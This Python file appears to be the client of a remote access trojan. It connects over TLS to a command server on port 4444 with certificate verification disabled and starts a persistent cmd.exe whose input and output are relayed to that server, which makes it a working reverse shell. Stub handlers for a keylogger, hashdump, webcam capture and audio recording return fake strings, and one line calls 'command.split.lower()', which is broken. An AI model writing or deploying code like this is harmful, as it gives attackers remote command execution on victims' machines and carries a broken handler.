import socket
import ssl
import subprocess
import threading

from utils.protocol import decode_message, encode_message
from utils.logger import logger


# ---------- GLOBAL SHELL ---------- #
shell_proc = None


# ---------- START SHELL ---------- #
def start_shell(client):
    global shell_proc

    if shell_proc:
        return

    logger.info("[+] Starting persistent shell")

    shell_proc = subprocess.Popen(
        ["cmd.exe"],  # change to /bin/bash for Linux
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    threading.Thread(
        target=read_shell_output,
        args=(client,),
        daemon=True
    ).start()


# ---------- READ SHELL OUTPUT ---------- #
def read_shell_output(client):
    global shell_proc

    try:
        for line in iter(shell_proc.stdout.readline, ''):
            if not line:
                break

            packet = {
                "type": "shell_output",
                "data": line
            }

            client.send(encode_message(packet))

    except Exception as e:
        logger.exception(f"Shell output error: {e}")


# ---------- SEND COMMAND TO SHELL ---------- #
def send_to_shell(command):
    global shell_proc

    if not shell_proc:
        return

    try:
        shell_proc.stdin.write(command + "\n")
        shell_proc.stdin.flush()

    except Exception as e:
        logger.exception(f"Shell input error: {e}")


# ---------- FAKE COMMANDS ---------- #
def handle_command(command: str, args=None) -> str:
    cmd = command.split.lower()

    if cmd == "ipconfig":
        return "Fake IP config:\nIP: 127.0.0.1\nGateway: 192.168.1.1"

    elif cmd == "download":
        return "Fake file sent to server"

    elif cmd == "upload":
        return "Fake file received from server"

    elif cmd == "screenshot":
        return "Fake screenshot captured"

    elif cmd == "webcam_snapshot":
        return "Fake webcam image captured"

    elif cmd == "record_audio":
        return "Fake audio recorded"

    elif cmd == "keylogger":
        return "Fake keylogger started"

    elif cmd == "hashdump":
        return "Fake hashdump data"

    elif cmd == "search":
        return "Fake search results"

    return f"Executed: {command}"


# -------- MAIN CLIENT LOOP -------- #
def main():
    host = "127.0.0.1"
    port = 4444

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client = context.wrap_socket(raw_socket, server_hostname=host)

    client.connect((host, port))
    logger.info("Securely connected to server")

    while True:
        try:
            data = client.recv(4096)

            if not data:
                logger.warning("Server closed connection")
                break

            msg = decode_message(data)
            msg_type = msg.get("type")

            # ---------- NORMAL COMMAND ---------- #
            if msg_type == "command":
                cmd = msg.get("cmd")
                args = msg.get("args")

                logger.info(f"[CMD] {cmd}")

                if cmd in ("disconnect", "__DISCONNECT__"):
                    logger.warning("Disconnected by server")
                    break

                result = handle_command(cmd, args)

                response = {
                    "type": "response",
                    "status": "ok",
                    "result": result
                }

                client.send(encode_message(response))

            # ---------- START SHELL ---------- #
            elif msg_type == "shell_start":
                start_shell(client)

            # ---------- SHELL COMMAND ---------- #
            elif msg_type == "shell_command":
                command = msg.get("cmd")
                send_to_shell(command)

        except ssl.SSLError as e:
            logger.error(f"SSL error: {e}")
            break

        except ConnectionResetError:
            logger.warning("Server disconnected (reset)")
            break

        except Exception as e:
            logger.exception(f"Unexpected error: {e}")
            break

    client.close()
    logger.info("Client stopped")


if __name__ == "__main__":
    main()